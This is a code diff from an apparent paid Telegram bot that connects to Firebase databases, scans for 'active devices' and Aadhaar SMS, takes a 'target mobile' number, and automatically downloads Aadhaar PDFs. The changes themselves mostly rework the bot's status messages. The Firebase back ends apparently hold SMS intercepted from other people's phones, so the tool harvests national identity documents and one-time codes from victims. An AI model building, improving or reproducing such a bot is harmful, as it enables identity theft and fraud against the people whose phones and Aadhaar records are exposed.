+            f"✅  <b>ᴛᴏᴛᴀʟ ᴘᴅғs ᴅᴇʟɪᴠᴇʀᴇᴅ:</b> <b>{len(ready_pdfs)} PDFs</b>\n"
+            f"❌  <b>ғᴀɪʟᴇᴅ / ɴᴏ sᴍs:</b> <b>{failed_count}</b>\n\n"
             f"💰  <b>ʀᴇᴍᴀɪɴɪɴɢ ᴄʀᴇᴅɪᴛs:</b> <b>{cr_display}</b>\n\n"
-            f"{DIVIDER}",
+            f"{DIVIDER}\n"
+            f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ғᴏʀ ᴀɴᴏᴛʜᴇʀ ᴅᴏᴡɴʟᴏᴀᴅ.</i>",
             reply_markup=get_welcome_inline_keyboard()
         )
     except Exception as e:
@@ -1875,14 +2010,6 @@ def handle_callback(chat_id, callback_query_id, data, message_id=None, user_info
             update_session_data(chat_id, 'fb_mobile', mob)
             update_session_data(chat_id, 'dev_id', dev.get('dev_id'))
             set_session(chat_id, 'downloading', get_session(chat_id)['data'])
-            send_message(
-                chat_id,
-                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-                f"<b>✅ ᴅᴇᴠɪᴄᴇ sᴇʟᴇᴄᴛᴇᴅ:</b> <code>+91 {mob}</code>\n"
-                f"📱  <b>ᴍᴏᴅᴇʟ:</b> {dev.get('model', 'Device')}\n"
-                f"🌐  <b>ғɪʀᴇʙᴀsᴇ:</b> <code>{fb_url}</code>\n\n"
-                f"<i>🚀  sᴛᴀʀᴛɪɴɢ ᴀᴜᴛᴏᴍᴀᴛɪᴄ ᴀᴀᴅʜᴀᴀʀ ᴅᴏᴡɴʟᴏᴀᴅ…</i>"
-            )
             worker_pool.submit(_handle_firebase_download_worker, chat_id, mob, fb_url, dev.get('dev_id'))
         except Exception as e:
             logger.error(f"Error handling fb_dev callback: {e}", exc_info=True)
@@ -2229,14 +2356,19 @@ def handle_message(chat_id, message_text, message_id=None, user_info=None):
             )
             return
 
-        send_message(
+        temp_msg = send_message(
             chat_id,
             f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-            f"<b>🔄 ᴛᴇsᴛɪɴɢ ғɪʀᴇʙᴀsᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ…</b>\n\n"
-            f"🌐  <code>{found_url}</code>"
+            f"<b>🔍 ᴄᴏɴɴᴇᴄᴛɪɴɢ &amp; sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ…</b>\n\n"
+            f"🌐  <code>{found_url}</code>\n"
+            f"<i>⏳  ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ᴀ ᴍᴏᴍᴇɴᴛ…</i>"
         )
+        temp_id = (temp_msg.get('result') or {}).get('message_id') if temp_msg else None
+
         ok_conn, conn_msg = bot.test_firebase_connection(found_url)
         if not ok_conn:
+            if temp_id:
+                delete_message(chat_id, temp_id)
             send_message(
                 chat_id,
                 f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
@@ -2248,29 +2380,19 @@ def handle_message(chat_id, message_text, message_id=None, user_info=None):
             return
 
         if found_mobile:
+            if temp_id:
+                delete_message(chat_id, temp_id)
             update_session_data(chat_id, 'fb_url', found_url)
             update_session_data(chat_id, 'fb_mobile', found_mobile)
             set_session(chat_id, 'downloading', get_session(chat_id)['data'])
-            send_message(
-                chat_id,
-                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-                f"✅  <b>ғɪʀᴇʙᴀsᴇ ᴄᴏɴɴᴇᴄᴛᴇᴅ!</b>\n\n"
-                f"🌐  <b>ᴅʙ:</b> <code>{found_url}</code>\n"
-                f"📱  <b>ᴍᴏʙɪʟᴇ:</b> <code>{found_mobile}</code>\n\n"
-                f"<i>🚀  sᴛᴀʀᴛɪɴɢ ᴀᴜᴛᴏᴍᴀᴛɪᴄ ᴀᴀᴅʜᴀᴀʀ ᴅᴏᴡɴʟᴏᴀᴅ…</i>"
-            )
             worker_pool.submit(_handle_firebase_download_worker, chat_id, found_mobile, found_url)
             return
         else:
             update_session_data(chat_id, 'fb_url', found_url)
-            send_message(
-                chat_id,
-                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-                f"<b>🔍 sᴄᴀɴɴɪɴɢ ᴀᴄᴛɪᴠᴇ ᴅᴇᴠɪᴄᴇs &amp; ᴀᴀᴅʜᴀᴀʀ ᴄᴀʀᴅs…</b>\n\n"
-                f"🌐  <code>{found_url}</code>\n"
-                f"<i>⏳  ғɪʀᴇʙᴀsᴇ sᴇ ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇs ᴀᴜʀ ᴀᴀᴅʜᴀᴀʀ sᴍs ғᴇᴛᴄʜ ʜᴏ ʀᴀʜᴇ ʜᴀɪɴ…</i>"
-            )
             ok_scan, scan_data = bot.scan_firebase_devices(found_url)
+            if temp_id:
+                delete_message(chat_id, temp_id)
+
             if ok_scan and scan_data.get('devices'):
                 set_session(chat_id, 'fb_devices_menu', {
                     'fb_url': found_url,
@@ -2318,12 +2440,6 @@ def handle_message(chat_id, message_text, message_id=None, user_info=None):
 
         update_session_data(chat_id, 'fb_mobile', mobile_candidate)
         set_session(chat_id, 'downloading', get_session(chat_id)['data'])
-        send_message(
-            chat_id,
-            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
-            f"✅  <b>ᴛᴀʀɢᴇᴛ ᴍᴏʙɪʟᴇ sᴇᴛ:</b> <code>{mobile_candidate}</code>\n\n"
-            f"<i>🚀  sᴛᴀʀᴛɪɴɢ ᴀᴜᴛᴏᴍᴀᴛɪᴄ ᴀᴀᴅʜᴀᴀʀ ᴅᴏᴡɴʟᴏᴀᴅ…</i>"
-        )
         worker_pool.submit(_handle_firebase_download_worker, chat_id, mobile_candidate, fb_url)
         return
 
